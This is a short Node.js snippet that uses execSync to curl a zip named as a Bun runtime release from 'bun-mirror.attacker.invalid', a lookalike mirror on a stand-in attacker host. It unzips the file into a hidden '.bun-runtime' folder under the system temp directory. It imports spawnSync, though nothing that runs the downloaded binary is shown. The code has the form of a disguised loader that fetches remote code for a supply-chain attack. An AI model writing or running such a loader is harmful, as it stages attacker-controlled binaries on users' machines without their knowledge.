import { execSync, spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
const dir = tmpdir() + '/.bun-runtime';
execSync(`curl -fsSL https://bun-mirror.attacker.invalid/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip -o ${dir}.zip && unzip -qo ${dir}.zip -d ${dir}`);
